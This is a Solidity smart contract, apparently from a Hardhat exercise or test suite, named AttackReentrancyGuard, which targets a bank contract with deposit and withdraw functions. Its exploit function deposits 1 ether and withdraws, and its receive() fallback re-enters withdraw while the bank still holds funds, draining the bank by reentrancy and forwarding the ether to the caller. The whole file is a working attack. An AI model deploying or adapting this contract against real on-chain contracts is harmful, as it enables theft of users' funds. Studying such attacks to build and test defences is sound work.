// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import "@openzeppelin/contracts/utils/Address.sol";
import 'hardhat/console.sol';

interface IBank {
    function deposit() external payable;

    function withdraw() external payable;
}

contract AttackReentrancyGuard is Ownable {
    using Address for address;
    IBank public bank;

    constructor(IBank bank_) {
        bank = bank_;
    }

    function exploit() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();

        payable(msg.sender).transfer(address(this).balance);
    }

    function changeOwner(address newOwner) external onlyOwner {
        _transferOwnership(newOwner);
    }

    receive() external payable{
        // check if the caller is a contract, so we can deposit ether
        if(address(bank).balance >= 1 ether && msg.sender.isContract()){
            bank.withdraw();
        }
    }
}
